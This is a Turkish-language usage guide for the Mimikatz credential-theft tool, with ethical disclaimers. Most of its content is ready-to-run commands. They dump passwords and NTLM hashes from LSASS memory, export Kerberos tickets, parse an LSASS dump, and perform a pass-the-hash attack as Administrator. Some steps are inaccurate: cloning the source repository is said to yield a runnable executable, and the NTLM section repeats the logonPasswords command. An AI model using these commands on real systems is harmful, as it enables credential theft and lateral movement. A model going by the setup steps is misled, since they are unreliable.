# Mimikatz Kullanım Rehberi

## Mimikatz Nedir?

**Mimikatz**, Windows sistemlerinde kimlik bilgilerini çıkarmak, analiz etmek ve test etmek için kullanılan popüler bir güvenlik aracıdır. Araç, LSASS belleğinden parola özetlerini, biletleri ve diğer kimlik bilgilerini çıkartabilir. Genellikle penetrasyon testlerinde ve güvenlik değerlendirmelerinde kullanılır.

> **Önemli Not:** Mimikatz yalnızca yetkili test ortamlarında ve etik kullanım amaçlı çalıştırılmalıdır. Yetkisiz kullanım yasa dışıdır.

---

## Ana Özellikleri

1. **Kimlik Bilgisi Çıkarma:**
   - Parola özetleri, Kerberos biletleri ve NTLM hash’lerini çıkarır.
2. **Yetki Yükseltme:**
   - Güvenlik açıklarından faydalanarak sistem yetkileri elde eder.
3. **Çoklu Platform Desteği:**
   - Farklı Windows sürümleriyle uyumlu çalışır.

---

## İndirme ve Çalıştırma

Mimikatz genellikle GitHub üzerinden sağlanır:

- [Mimikatz GitHub Sayfası](https://github.com/gentilkiwi/mimikatz)

### Çalıştırma Adımları

1. **Araç Dosyasını İndirin:**
   ```bash
   git clone https://github.com/gentilkiwi/mimikatz.git
   cd mimikatz/Win32
   ```

2. **Araç Dosyasını Çalıştırın:**
   ```cmd
   mimikatz.exe
   ```

---

## Kullanım Komutları

### 1. **Kimlik Bilgisi Çıkarma (logonPasswords)**

LSASS belleğinden oturum bilgilerini çıkarır.

**Kullanım:**
```cmd
privilege::debug
sekurlsa::logonPasswords
```

### 2. **NTLM Hash Çıkarma**

NTLM hash'lerini listelemek için kullanılır.

**Kullanım:**
```cmd
privilege::debug
sekurlsa::logonPasswords
```

### 3. **Kerberos Bileti Çıkarma (Kerberos::list)**

Kerberos biletlerini görüntüler.

**Kullanım:**
```cmd
privilege::debug
kerberos::list /export
```

### 4. **Parola Kırma İçin Dump Alma (sekurlsa::minidump)**

LSASS işleminin bir dump dosyasını oluşturur.

**Kullanım:**
```cmd
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
```

### 5. **Pass-The-Hash Saldırısı**

NTLM hash'i kullanarak kimlik doğrulama yapar.

**Kullanım:**
```cmd
sekurlsa::pth /user:Administrator /domain:example.local /ntlm:<hash> /run:cmd
```

---

## Örnek Kullanım Senaryoları

### 1. LSASS Belleğinden Parola Çıkarma
```cmd
privilege::debug
sekurlsa::logonPasswords
```

### 2. Kerberos Bileti Çıkarma ve Kaydetme
```cmd
privilege::debug
kerberos::list /export
```

### 3. NTLM Hash Kullanarak Kimlik Doğrulama
```cmd
sekurlsa::pth /user:admin /domain:example.local /ntlm:<hash> /run:cmd
```

---

## Güvenlik ve Önlemler

- **Yetkili Kullanıcılar:** Mimikatz yalnızca güvenlik uzmanları ve yetkili sistem yöneticileri tarafından kullanılmalıdır.
- **Test Ortamı:** Araç, üretim ortamında kullanılmadan önce test ortamında değerlendirilmelidir.
- **Loglama:** Çalıştırılan komutlar sistem loglarına kaydedilebilir. Yasalara uygun hareket edilmelidir.

---

## Kaynaklar

- [Mimikatz GitHub Sayfası](https://github.com/gentilkiwi/mimikatz)
- [Windows Kimlik Doğrulama Belgeleri](https://learn.microsoft.com/en-us/windows-server/security/)

---

> **Uyarı:** Bu rehber yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımlar yasa dışıdır.
